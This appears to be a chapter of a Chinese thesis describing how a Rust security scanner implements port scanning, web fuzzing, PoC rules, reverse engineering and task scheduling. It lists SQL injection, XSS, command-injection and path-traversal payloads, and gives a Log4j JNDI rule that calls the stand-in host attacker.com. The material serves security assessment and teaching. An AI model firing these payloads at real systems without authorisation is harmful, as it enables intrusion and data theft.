# 第四章 核心功能模块实现

本章详细阐述 rscan_codex 系统五大核心功能模块的具体实现过程。基于第三章设计的分层架构，各模块通过统一的 `ScanEngine` Trait 接口进行调度，利用 Rust 语言的异步特性（Tokio）和并行计算能力（Rayon），实现了高性能、高并发的安全扫描与逆向分析功能。

## 4.1 主机/端口扫描模块实现

主机与端口扫描是网络安全评估的基础。本模块位于 `src/cores/host/` 目录下，实现了从网络层发现到传输层探测的全栈扫描能力，支持 TCP、UDP、SYN 等多种协议，并集成了服务指纹识别技术。

### 4.1.1 TCP全连接扫描实现

TCP 全连接扫描（Connect Scan）是最基础且最可靠的扫描方式。其核心原理是利用操作系统的 `connect()` 系统调用完成完整的 TCP 三次握手。

在实现上，本模块采用了 **Tokio 异步运行时** 来管理大量的并发连接请求。与传统阻塞式 I/O 不同，异步 I/O 允许单个线程同时处理成千上万个连接状态机，极大地提高了扫描效率。

关键实现逻辑如下：

1. **连接建立**：使用 `tokio::net::TcpStream::connect()` 发起非阻塞连接请求。该方法返回一个 `Future`，不会阻塞当前线程。

2. **超时控制**：为每个连接设置独立的 `timeout`（默认 3 秒），防止因目标主机无响应导致的资源悬挂。若超时，则判定端口为 `Filtered` 或 `Closed`。代码实现中使用了 `tokio::time::timeout()` 包装器：

```rust
let result = timeout(
    Duration::from_secs(config.timeout_seconds),
    TcpStream::connect(SocketAddr::new(host, port))
).await;
```

3. **结果判定**：
   - 若 `connect()` 返回 `Ok`，说明三次握手成功，端口状态标记为 `Open`。
   - 若返回 `ConnectionRefused`，说明目标主机主动拒绝，端口状态标记为 `Closed`。
   - 若返回 `Timeout` 或其他错误，标记为 `Filtered`。

为了进一步优化性能，模块引入了 **并发控制机制**。通过 `tokio::task::JoinSet` 管理并发任务，并使用信号量（Semaphore）限制最大并发连接数（默认 1000），避免触发目标主机的防火墙限流策略或导致本地文件描述符耗尽。

此外，模块支持多种端口扫描顺序策略：
- **Serial**：按端口号顺序扫描
- **Random**：随机打乱端口顺序，降低被检测概率
- **Interleave**：交错扫描，平衡速度与隐蔽性

### 4.1.2 UDP扫描实现

UDP 扫描比 TCP 扫描更为复杂，因为 UDP 是无连接协议，不存在标准的握手过程。本模块采用 **ICMP 端口不可达消息反馈机制** 来判断端口状态。

实现流程如下：

1. **发送探测包**：向目标主机的特定 UDP 端口发送空数据包或特定协议的 Payload（如 DNS Query）。

2. **监听响应**：
   - 若收到 ICMP `Port Unreachable` (Type 3, Code 3) 消息，则判定端口为 `Closed`。
   - 若收到 UDP 响应数据，则判定端口为 `Open`。
   - 若在超时时间内未收到任何响应，则判定为 `Open|Filtered`（可能开放也可能被防火墙丢弃）。

由于 UDP 扫描严重依赖 ICMP 反馈，而许多防火墙会过滤 ICMP 消息，因此本模块实现了 **重试机制** 和 **多协议探针策略**。对于常见服务（如 DNS 53, SNMP 161, NTP 123），发送符合协议规范的请求包以提高命中率。例如，向 53 端口发送标准的 DNS A 记录查询请求，若收到 DNS 响应包，即可确认为开放的 DNS 服务。

在代码实现中，UDP 扫描器使用了 `tokio::net::UdpSocket` 进行异步收发，并通过 `spawn_blocking` 将部分同步操作卸载到独立线程池，避免阻塞异步运行时。

### 4.1.3 SYN半开扫描实现（Raw Socket）

SYN 扫描（Stealth Scan）是一种隐蔽性较强的扫描技术，它只发送 SYN 包而不完成三次握手，因此不会在目标主机的应用层日志中留下连接记录。

由于标准 Socket API 无法直接构造原始 IP/TCP 头部，本模块使用了 **pnet 库** 提供的 Raw Socket 功能。在 Linux/macOS 环境下，这需要 root 权限或 `CAP_NET_RAW` 能力。

实现细节如下：

1. **创建传输通道**：使用 `pnet::transport::transport_channel()` 创建 Layer 4 级别的 TCP 传输通道，允许直接发送和接收原始 TCP 数据包。

2. **构造 SYN 包**：手动构建 TCP 头部，设置 SYN 标志位、序列号、窗口大小等字段，并计算校验和（Checksum）。代码示例：

```rust
let mut tcp_packet = MutableTcpPacket::new(&mut tcp_buffer[..]).unwrap();
tcp_packet.set_source(source_port);
tcp_packet.set_destination(port);
tcp_packet.set_sequence(seq_num);
tcp_packet.set_flags(TcpFlags::SYN);
tcp_packet.set_window(64240);
let checksum = pnet::packet::tcp::ipv4_checksum(&tcp_packet.to_immutable(), &local_ip, &dest_ip);
tcp_packet.set_checksum(checksum);
```

3. **发送与接收**：通过 `tx.send_to()` 发送 SYN 包，然后通过 `tcp_packet_iter` 监听响应。若收到 SYN+ACK，则判定端口开放；若收到 RST，则判定关闭；若超时未响应，则判定为过滤状态。

4. **回退机制**：当原始套接字不可用时（如权限不足），模块会自动回退到普通 TCP Connect 扫描，确保功能的可用性。

### 4.1.4 ARP/ICMP主机发现实现

在局域网环境中，ARP（Address Resolution Protocol）扫描是最有效的主机发现方法。本模块通过向目标 IP 地址发送 ARP 请求，根据是否收到 ARP 响应判断主机是否在线。

**ARP 扫描实现**：
- 使用 `pnet::datalink` 创建数据链路层通道
- 构造 ARP Request 包，包含源 MAC 地址和目标 IP 地址
- 监听 ARP Reply，提取目标主机的 MAC 地址

**ICMP 扫描实现**：
- 适用于跨网段的主机发现
- 发送 ICMP Echo Request（Ping 包）
- 根据是否收到 Echo Reply 判断主机状态
- 支持 IPv4 和 IPv6 双栈

为了提高发现效率，模块采用了 **并发探测策略**，同时向多个目标发送探测包，并通过 `JoinSet` 收集响应结果。对于大型网段（如 /24），可将扫描时间从分钟级缩短到秒级。

### 4.1.5 服务指纹识别实现

服务指纹识别是通过分析目标服务的响应特征来识别其类型和版本的技术。本模块位于 `src/services/service_probe.rs`，采用了类似 nmap 的 probe-based 指纹识别方法。

实现流程包括三个阶段：

1. **Probe 定义**：预定义一系列探测包（probes），每个 probe 包含特定的 payload 和发送条件。例如，对于 HTTP 服务，可以发送 `GET / HTTP/1.0\r\n\r\n` 请求。

2. **响应匹配**：将目标服务的响应与预定义的指纹规则进行正则匹配。规则文件中定义了各种服务的特征字符串，如：
   - Apache: `Server: Apache/(\d+\.\d+\.\d+)`
   - Nginx: `Server: nginx/(\d+\.\d+\.\d+)`
   - SSH: `SSH-(\d+\.\d+)-OpenSSH_(\d+\.\d+)`

3. **置信度评估**：根据匹配程度给出服务识别的置信度。若多个 probe 都匹配同一服务，则提高置信度；若匹配冲突，则选择置信度最高的结果。

本模块内置了常用服务的 probe 定义，并支持用户自定义 probe 文件，具有良好的扩展性。识别结果会被附加到扫描结果的 `metadata` 字段中，供后续漏洞检测模块使用。

## 4.2 Web安全扫描模块实现

Web 安全扫描模块位于 `src/cores/web/` 和 `src/modules/web_scan/` 目录下，提供了目录爆破、Fuzz 测试、子域名枚举和 Web 爬虫等功能。

### 4.2.1 并发HTTP请求引擎实现

Web 扫描的核心是高并发的 HTTP 请求引擎。本模块基于 `reqwest` 库构建了异步 HTTP 客户端池，支持数千个并发请求。

关键设计要点：

1. **连接池复用**：`reqwest::Client` 内部维护了连接池，自动复用 TCP 连接，减少握手开销。通过设置 `pool_max_idle_per_host` 和 `pool_idle_timeout` 优化连接复用策略。

2. **速率限制**：使用 `governor` 库实现令牌桶算法，限制每秒请求数，避免对目标服务器造成过大压力。用户可通过 `--rate-limit` 参数自定义速率上限。

3. **错误重试**：对于网络超时、连接重置等临时错误，自动进行指数退避重试（Exponential Backoff），最大重试次数可配置。

4. **Host 级别并发控制**：为避免对单一主机发起过多请求，实现了 per-host 并发限制。每个目标主机的并发请求数不超过设定值（默认 10），总并发数不超过全局上限（默认 100）。

### 4.2.2 目录爆破算法实现

目录爆破（Directory Brute Force）是通过尝试常见目录和文件名来发现 Web 应用隐藏路径的技术。

本模块的实现特点：

1. **字典加载**：支持从文件加载自定义字典，也内置了常用路径字典（如 `common.txt`, `directory-list-2.3-medium.txt`）。字典条目经过预处理，去除重复项和无效字符。

2. **URL 拼接**：将字典中的路径与目标 URL 智能拼接，处理斜杠、编码等边界情况。例如，目标为 `http://example.com/admin/`，字典项为 `login.php`，则生成 `http://example.com/admin/login.php`。

3. **响应分类**：根据 HTTP 状态码和响应内容对结果进行分类：
   - **200 OK**：有效页面
   - **301/302 Redirect**：重定向页面，记录跳转目标
   - **403 Forbidden**：禁止访问，但路径存在
   - **404 Not Found**：路径不存在

4. **去重优化**：使用 **simhash 算法** 对响应内容进行指纹计算。若两个页面的 simhash 汉明距离小于阈值（默认 3），则认为是相似页面，只保留第一个结果。这有效避免了因动态内容导致的重复报告。

### 4.2.3 Web Fuzz测试实现

Web Fuzz 测试是通过向 Web 应用发送异常或边界值输入来发现潜在漏洞的技术。

本模块支持多种 Fuzz 策略：

1. **参数 Fuzz**：对 URL 查询参数、POST 数据、Cookie 等进行变异测试。支持的 Payload 类型包括：
   - SQL 注入：`' OR 1=1 --`, `UNION SELECT ...`
   - XSS：`<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`
   - 命令注入：`; ls -la`, `| cat /etc/passwd`
   - 路径遍历：`../../../etc/passwd`, `..%2f..%2f..%2fetc%2fpasswd`

2. **路径 Fuzz**：在 URL 路径中插入特殊字符、编码序列、超长字符串等，测试服务器的解析健壮性。

3. **HTTP 头 Fuzz**：对 `User-Agent`、`Referer`、`X-Forwarded-For` 等头部进行注入测试，检测头部解析漏洞。

Fuzz 测试的关键在于结果分析。本模块通过分析响应状态码、响应长度、响应时间、错误信息等指标来识别异常响应，并结合启发式规则判断潜在漏洞。例如，若注入 SQL Payload 后响应中包含 "SQL syntax" 或 "mysql_fetch" 等关键字，则判定为可能存在 SQL 注入漏洞。

### 4.2.4 DNS子域名枚举实现

子域名枚举是通过各种技术手段发现目标域名的子域名列表。本模块支持以下几种枚举方法：

1. **字典爆破**：使用常见子域名字典（如 `subdomains-top1million-5000.txt`）进行暴力猜测。对每个候选子域名构造完整域名（如 `www.example.com`），通过 DNS A 记录查询验证是否存在。

2. **证书透明度查询**：查询 Certificate Transparency（CT）日志获取已颁发证书中的子域名。通过访问 `crt.sh` 等公开 API，可以快速获取大量历史子域名记录，无需发送大量 DNS 请求。

3. **搜索引擎查询**：通过 Google、Bing 等搜索引擎的 `site:` 语法发现子域名。例如，搜索 `site:example.com -www` 可以找到除 www 外的其他子域名。

4. **DNS 区域传输**：尝试向目标域名的 DNS 服务器发起 AXFR 请求，获取完整域名列表。虽然成功率较低（大多数服务器已禁用此功能），但一旦成功可获得最全面的子域名信息。

每种方法都有其适用场景和局限性，本模块通过组合多种方法来提高子域名发现的覆盖率。最终结果会进行去重和有效性验证，只保留能解析到 IP 地址的子域名。

### 4.2.5 HTML解析与链接提取

Web 爬虫模块负责自动遍历 Web 站点并提取有用信息。本模块使用 `scraper` 库解析 HTML 文档，提取其中的链接和资源。

实现要点：

1. **智能链接提取**：解析 `<a>`、`<img>`、`<script>`、`<link>` 等标签，提取 `href`、`src` 属性中的 URL。支持相对路径到绝对路径的转换。

2. **深度控制**：支持设置最大爬取深度（`--max-depth`），避免无限递归。例如，深度为 2 表示只爬取目标页面及其直接链接的页面。

3. **范围限制**：只爬取指定域名和路径范围内的页面，避免爬取外部链接。可通过 `--scope` 参数自定义爬取范围。

4. **robots.txt 遵循**：在爬取前检查目标站点的 `robots.txt` 文件，尊重网站的爬取规则。若某路径被禁止，则跳过该路径。

5. **去重优化**：使用 **布隆过滤器（Bloom Filter）** 快速判断 URL 是否已访问。布隆过滤器以极小的内存占用实现高效的成员查询，适合大规模 URL 去重场景。

爬取到的内容会被用于后续的漏洞检测，如敏感信息泄露检测、XSS Payload 测试等。

## 4.3 漏洞检测模块实现

漏洞检测模块位于 `src/modules/vuln_check/` 目录下，提供了 PoC 执行引擎、容器安全审计和 Web 漏洞检测等功能。

### 4.3.1 PoC执行引擎设计

PoC（Proof of Concept）执行引擎是漏洞检测的核心。本模块设计了灵活的 PoC 描述语言，支持 HTTP 请求构造、响应匹配和漏洞判定。

PoC 执行流程：

1. **PoC 加载**：从 YAML/JSON 文件中加载 PoC 定义，包括请求模板、匹配规则和漏洞信息。

2. **请求构造**：根据 PoC 定义构造 HTTP 请求，支持自定义方法、头部、Body、Query 参数等。

3. **请求发送**：通过 HTTP 引擎发送请求，获取响应。

4. **响应匹配**：根据定义的匹配规则（正则表达式、关键字、状态码等）判断是否存在漏洞。

5. **结果输出**：若匹配成功，则记录漏洞详情，包括漏洞类型、严重程度、证据等。

为提高安全性，PoC 执行在沙箱环境中进行，限制了网络访问范围和系统调用权限，防止恶意 PoC 对宿主系统造成影响。

### 4.3.2 YAML/JSON规则解析

本模块支持 YAML 和 JSON 两种格式的规则定义。YAML 因其可读性强而被推荐使用。

规则文件结构示例：

```yaml
id: CVE-2021-44228
name: Log4j Remote Code Execution
severity: critical
requests:
  - method: POST
    path: /api/login
    headers:
      User-Agent: ${jndi:ldap://attacker.com/a}
    matchers:
      - type: word
        words:
          - "JNDI lookup error"
      - type: status
        status:
          - 500
```

解析器使用 `serde_yaml` 和 `serde_json` 库将规则文件反序列化为内部数据结构。支持变量替换、条件判断、循环等高级特性，使得规则编写更加灵活。

### 4.3.3 容器安全审计实现

容器安全审计模块用于检测 Docker 容器和镜像中的安全风险。

审计内容包括：

1. **Dockerfile 检查**：分析 Dockerfile 中的最佳实践遵守情况，如是否使用最新基础镜像、是否暴露不必要的端口、是否以 root 用户运行等。

2. **镜像层分析**：解析容器镜像的各层内容，检测已知漏洞组件（通过 CVE 数据库匹配）、敏感文件泄露（如 `.env`、私钥文件）、恶意软件等。

3. **运行时配置检查**：检查容器的运行时配置，如是否启用了特权模式、是否挂载了敏感目录、网络模式是否安全等。

本模块通过与 Docker API 交互获取容器和镜像信息，结合静态分析和规则匹配进行检测。检测结果会以结构化格式输出，便于集成到 CI/CD 流水线中。

### 4.3.4 Web漏洞检测模板

Web 漏洞检测模板是针对常见 Web 漏洞的预定义检测规则集合。本模块内置了多种漏洞检测模板，包括：

- **SQL 注入**：通过注入特殊字符和 SQL 语句，检测数据库错误信息或响应差异
- **XSS（跨站脚本）**：注入 JavaScript 代码，检测是否被执行或反射
- **文件包含**：尝试包含本地或远程文件，检测是否成功读取
- **命令注入**：注入系统命令，检测是否被执行
- **XXE（XML 外部实体）**：构造恶意 XML，检测是否解析外部实体
- **SSRF（服务端请求伪造）**：尝试访问内网地址，检测是否可达

每个模板都包含了多个测试用例和匹配规则，确保检测的准确性和全面性。用户也可以根据实际需求自定义检测模板。

## 4.4 逆向分析模块实现

逆向分析模块位于 `src/modules/reverse/` 目录下，集成了 Ghidra、Tantivy 等工具，提供了强大的二进制文件分析能力。

### 4.4.1 Ghidra集成适配器实现

Ghidra 是一款开源的反编译框架，本模块通过 Headless 模式（无界面模式）与其集成，实现自动化分析。

集成方案：

1. **进程管理**：通过 `std::process::Command` 启动 Ghidra Headless 进程，传入分析脚本和参数。

2. **脚本注入**：编写 Java/Ghidra Script 脚本，执行反编译、函数提取、字符串搜索等操作，并将结果导出为 JSONL 格式。

3. **结果解析**：解析 Ghidra 输出的 JSONL 文件，提取函数签名、伪代码、交叉引用等信息，转换为内部数据结构。

4. **缓存机制**：为避免重复分析，对已分析的二进制文件建立缓存索引。若文件哈希值未变化，则直接返回缓存结果。

本模块内置了精简版 Ghidra（位于 `third_party/ghidra_core_headless_x86_min/`），用户也可通过环境变量 `RSCAN_GHIDRA_HOME` 指定完整版 Ghidra 路径。

### 4.4.2 多格式二进制文件支持

本模块支持多种二进制文件格式的分析，包括：

- **ELF（Executable and Linkable Format）**：Linux/Unix 系统的标准可执行文件格式
- **PE（Portable Executable）**：Windows 系统的可执行文件格式
- **APK（Android Package）**：Android 应用打包格式，本质上是 ZIP 文件的变种

使用 `goblin` 库解析文件头部，提取以下信息：
- 入口点地址
- 导入/导出函数表
- 节区信息（.text, .data, .rodata 等）
- 字符串表
- 符号表

根据文件类型自动选择合适的分析策略。例如，对于 APK 文件，先解压获取 classes.dex，再通过 JADX 转换为 Java 源码进行分析。

### 4.4.3 静态分析与反编译流程

静态分析流程包括以下步骤：

1. **文件识别**：通过魔数（Magic Number）和文件扩展名识别文件类型。

2. **架构检测**：解析文件头部，确定 CPU 架构（x86, x64, ARM, MIPS 等）和字节序。

3. **反汇编**：使用 `capstone` 引擎将机器码转换为汇编指令。

4. **控制流图生成**：识别基本块（Basic Block）和跳转指令，构建控制流图（CFG）。

5. **反编译**：调用 Ghidra 的反编译器，将汇编代码转换为类 C 语言的伪代码。

6. **关键函数定位**：通过函数名、字符串引用、API 调用等特征，定位敏感函数（如加密函数、网络通信函数、文件操作函数等）。

分析结果以结构化格式存储，支持后续查询和展示。

### 4.4.4 Tantivy代码索引与搜索

为实现高效的代码搜索，本模块集成了 **Tantivy** 搜索引擎，对反编译后的代码建立全文索引。

索引构建流程：

1. **文本提取**：从 Ghidra 输出中提取函数名、伪代码、字符串等文本内容。

2. **分词处理**：对代码文本进行分词，识别标识符、关键字、运算符等 token。

3. **索引建立**：使用 Tantivy 建立倒排索引，支持快速全文搜索。

4. **查询优化**：支持布尔查询、模糊匹配、正则表达式等高级搜索功能。

通过 Tantivy，用户可以在大型二进制文件中快速定位关键代码片段，如搜索特定的 API 调用、字符串常量或函数名，极大提高了逆向分析效率。

### 4.4.5 轻量动态分析实现

除了静态分析，本模块还提供了轻量级的动态分析能力，通过 **strace** 系统调用追踪获取程序运行时行为。

实现方式：

1. **进程启动**：以子进程方式启动目标程序，附加 strace 跟踪。

2. **系统调用捕获**：记录程序执行过程中的所有系统调用，包括文件操作、网络连接、进程创建等。

3. **行为分析**：分析系统调用序列，识别可疑行为模式，如：
   - 频繁读取敏感文件（/etc/shadow, ~/.ssh/id_rsa）
   - 发起异常网络连接（连接到非常见端口或域名）
   - 创建隐藏文件或修改系统配置

4. **抽样策略**：为避免性能开销过大，采用抽样跟踪策略，只记录关键系统调用或在特定触发条件下启动跟踪。

动态分析结果与静态分析结果相互补充，提供更全面的程序行为视图。

## 4.5 统一任务引擎实现

统一任务引擎位于 `src/cores/engine/` 目录下，是整个系统的中枢神经，负责任务调度、状态管理、进度监控和结果持久化。

### 4.5.1 异步并发调度实现

任务引擎基于 **Tokio 异步运行时** 构建，实现了高效的任务调度机制。

核心组件：

1. **任务队列**：使用 `tokio::sync::mpsc` 通道实现任务队列，生产者（CLI/TUI）将任务发送到队列，消费者（Worker）从队列中取出任务执行。

2. **Worker 池**：维护固定数量的 Worker 线程，每个 Worker 独立处理任务。Worker 数量可根据 CPU 核心数动态调整。

3. **优先级调度**：支持任务优先级设置，高优先级任务优先执行。通过 `PriorityQueue` 数据结构实现。

4. **资源限制**：使用信号量（Semaphore）限制并发任务数，防止资源耗尽。不同类型的任务可设置不同的并发上限。

调度算法采用 **工作窃取（Work Stealing）** 策略，空闲的 Worker 可以从繁忙 Worker 的队列中窃取任务，实现负载均衡。

### 4.5.2 任务状态管理

任务状态机定义了任务在整个生命周期中的状态转换规则：

```
Queued → Running → Succeeded
                ↘→ Failed  
                ↘→ Canceled
```

状态转换规则：
- 只有 `Queued` 状态的任务可以开始执行（转换为 `Running`）
- `Running` 状态的任务可以成功完成（`Succeeded`）、失败（`Failed`）或被取消（`Canceled`）
- `Succeeded`、`Failed`、`Canceled` 状态是终态，不能再转换

状态更新通过事件驱动机制实现。每当任务状态发生变化时，触发相应的事件，通知 TUI 刷新界面，并将状态变更持久化到磁盘。

### 4.5.3 进度监控与事件记录

任务引擎提供了细粒度的进度监控和事件记录功能。

**进度监控**：
- 对于可预估进度的任务（如端口扫描、目录爆破），实时计算完成百分比
- 对于不可预估进度的任务（如逆向分析），提供阶段性进度提示（如"正在反编译..."、"正在索引..."）
- 进度信息通过 `ProgressEvent` 事件上报，TUI 订阅该事件并更新进度条

**事件记录**：
- 所有任务执行过程中的事件（日志、进度、指标、控制指令）都被记录为 `TaskEvent` 对象
- 事件以 **JSON Lines** 格式追加写入 `events.jsonl` 文件，便于后续分析和调试
- 事件类型包括：
  - `Log`：日志消息，包含级别（info/warn/error）和文本
  - `Progress`：进度更新，包含完成百分比
  - `Metric`：性能指标，如扫描速度、内存占用等
  - `Control`：控制指令，如暂停、恢复、取消

### 4.5.4 结果持久化存储

扫描结果和任务元数据需要持久化存储，以便后续查询和分析。

**存储结构**：
每个任务在工作区目录下创建独立的子目录：
```
workspace/
└── tasks/
    └── task-<id>/
        ├── meta.json      # 任务元数据
        ├── events.jsonl   # 事件流日志
        ├── stdout.log     # 标准输出日志
        ├── stderr.log     # 错误输出日志
        └── artifacts/     # 扫描产物（可选）
```

**元数据存储**：
- `meta.json` 包含任务的基本信息、状态、配置、起止时间、产物路径等
- 使用 `serde_json` 序列化为 JSON 格式，支持人类可读和机器解析

**结果聚合**：
- 扫描结果（如开放端口、Web 路径、漏洞列表）存储在 `artifacts/` 目录下
- 支持多种输出格式：JSON、CSV、Raw Text
- 提供结果查询接口，支持按任务 ID、标签、时间范围等条件过滤

**清理策略**：
- 支持自动清理过期任务，释放磁盘空间
- 用户可配置保留策略（如保留最近 30 天的任务，或保留最多 100 个任务）

通过统一的任务引擎，rscan_codex 实现了任务的标准化管理和高效执行，为用户提供了稳定可靠的使用体验。
